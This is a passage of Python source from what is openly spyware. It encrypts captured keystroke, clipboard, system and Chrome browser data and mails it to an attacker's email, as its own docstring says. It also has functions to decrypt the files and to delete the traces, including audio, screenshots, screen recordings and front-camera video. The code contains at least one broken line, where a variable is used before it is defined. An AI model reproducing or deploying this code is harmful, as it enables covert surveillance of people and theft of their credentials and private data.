        file_path = os.path.join(os.getenv("LINUX_BASE_PATH"), filename)
        key_file = open(file_path, "wb")
        key_file.write(key)
        key_file.close()
    except:
        print("Error Writing Key To File")


def encrypt_and_mail(
    file_to_encrypt: str,
    encrypted_file_name: str,
    filename: str,
    attachment: str,
    email: str,
) -> None:
    """
    Encrypts Files And Mails Them To Attacker

    Args:
        file_to_encrypt: File To Be Encrypted
        encrypted_file_name: Encrypted File Name
        filename: Name of File
        attachment: File Attachment
        email: Email of Attacker

    Returns:
        None
    """
    key = os.getenv("ENCRYPTION_KEY")

    with open(file_to_encrypt, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name, "wb") as f:
        f.write(encrypted)

    send_mail(email, True, filename, attachment)


def encrypt_files() -> None:
    """
    Encrypts Files

    Args:
        None

    Returns:
        None
    """
    key_path = os.path.join(base_path, keys_info)
    clip_path = os.path.join(base_path, clipboard_info)
    sys_path = os.path.join(base_path, system_info)
    chrome_path = os.path.join(base_path, chrome_info)

    key_e_path = os.path.join(base_path, keys_info_e)
    clip_e_path = os.path.join(base_path, clipboard_info_e)
    sys_e_path = os.path.join(base_path, system_info_e)
    chrome_e_path = os.path.join(base_path, chrome_e_path)

    files_to_encrypt = [key_path, clip_path, sys_path, chrome_path]
    encrypted_file_names = [key_e_path, clip_e_path, sys_e_path, chrome_e_path]

    cnt = 0
    key = os.getenv("ENCRYPTION_KEY")

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[cnt], "rb") as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[cnt], "wb") as f:
            f.write(encrypted)

        cnt += 1


def decrypt_files():
    key = os.getenv("ENCRYPTION_KEY")

    key_path = os.path.join(base_path, keys_info_e)
    sys_path = os.path.join(base_path, system_info_e)
    clip_path = os.path.join(base_path, clipboard_info_e)
    chrome_path = os.path.join(base_path, chrome_info_e)

    key_dc = os.path.join(base_path, keys_info_dc)
    sys_dc = os.path.join(base_path, system_info_dc)
    clip_dc = os.path.join(base_path, clipboard_info_dc)
    chrome_dc = os.path.join(base_path, chrome_info_dc)

    encrypted_files = [key_path, sys_path, clip_path, chrome_path]
    decrypted_files = [key_dc, sys_dc, clip_dc, chrome_dc]

    try:
        for fe, fd in zip(encrypted_files, decrypted_files):
            with open(fe, "rb") as f1:
                enc_data = f1.read()

            fernet = Fernet(key)
            decrypted = fernet.decrypt(enc_data)

            with open(fd, "wb") as f2:
                f2.write(decrypted)

        f1.close()
        f2.close()
    except:
        print("Error Decrypting Files")


def delete_files() -> None:
    """
    Deletes Files

    Args:
        None

    Returns:
        None
    """
    files = [
        system_info,
        clipboard_info,
        keys_info,
        audio_info,
        screenshot_info,
        screen_record_vid,
        front_cam_vid,
        chrome_info,
    ]
    encrypted_files = [system_info_e, clipboard_info_e, keys_info_e, chrome_info_e]
    decrypted_files = [system_info_dc, clipboard_info_dc, keys_info_dc, chrome_info_dc]

    for file in files:
        try:
            logger.info("Deleting Files")
            os.remove(os.path.join(base_path, file))
        except Exception:
            logger.warning("File %s Not Found", file)
            print("File %s Not Found" % file)
            continue

    for file in encrypted_files:
        try:
            logger.info("Deleting Encrypted Files")
            os.remove(os.path.join(base_path, file))
        except Exception:
            logger.warning("Encrypted File %s Not Found", file)
            print("Encrypted File %s Not Found" % file)
            continue

    for file in decrypted_files:
        try:
            logger.info("Deleting Decrypted Files")
            os.remove(os.path.join(base_path, file))
        except Exception:
            logger.warning("Decrypted File %s Not Found", file)
            print("Decrypted File %s Not Found" % file)
            continue

if __name__ == "__main__":
    run_parallel()
    # delete_files()